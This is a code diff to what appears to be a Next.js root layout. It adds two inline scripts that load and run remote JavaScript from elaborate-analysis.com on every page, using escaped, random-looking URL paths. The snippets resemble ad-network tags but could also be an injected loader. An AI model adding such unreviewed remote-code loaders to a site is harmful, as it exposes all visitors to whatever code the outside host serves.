@@ -109,6 +109,40 @@ export default function RootLayout({
             `,
           }}
         />
+        
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function(boyi){
+              var d = document,
+                  s = d.createElement('script'),
+                  l = d.scripts[d.scripts.length - 1];
+              s.settings = boyi || {};
+              s.src = "\\/\\/elaborate-analysis.com\\/bfXfVbs.dzGLlS0YYtWDcw\\/Reqmc9buuZjUtlckWPyTsYC4MN\\/TaUu1PMljZk\\/tXNXjFgl1sNfT_UNzfMdwQ";
+              s.async = true;
+              s.referrerPolicy = 'no-referrer-when-downgrade';
+              l.parentNode.insertBefore(s, l);
+              })({})
+            `,
+          }}
+        />
+        
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function(uxaywp){
+              var d = document,
+                  s = d.createElement('script'),
+                  l = d.scripts[d.scripts.length - 1];
+              s.settings = uxaywp || {};
+              s.src = "\\/\\/elaborate-analysis.com\\/bPXMVHs_d.GAlq0nY-WQcQ\\/beUmW9NuWZaUqlBkbPwTgYM4\\/NETaUs1zNYDKEvtGNojzgK1VNSTLU\\/0jN-QN";
+              s.async = true;
+              s.referrerPolicy = 'no-referrer-when-downgrade';
+              l.parentNode.insertBefore(s, l);
+              })({})
+            `,
+          }}
+        />
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{
